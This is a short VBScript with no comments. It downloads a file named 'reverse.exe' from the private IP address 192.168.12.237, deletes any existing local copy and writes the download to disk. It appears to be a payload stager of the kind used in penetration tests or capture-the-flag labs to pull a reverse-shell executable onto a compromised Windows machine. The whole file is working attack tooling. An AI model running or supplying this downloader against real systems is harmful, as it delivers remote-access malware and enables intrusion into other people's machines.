URL = "http://192.168.12.237/reverse.exe"
parts = split(URL,"/") 
saveTo = parts(ubound(parts))

Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")

objXMLHTTP.open "GET", URL, false
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1

objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0

Set objFSO = Createobject("Scripting.FileSystemObject")
If objFSO.Fileexists(saveTo) Then objFSO.DeleteFile saveTo
Set objFSO = Nothing

objADOStream.SaveToFile saveTo
objADOStream.Close
Set objADOStream = Nothing
End if

Set objXMLHTTP = Nothing

WScript.Quit
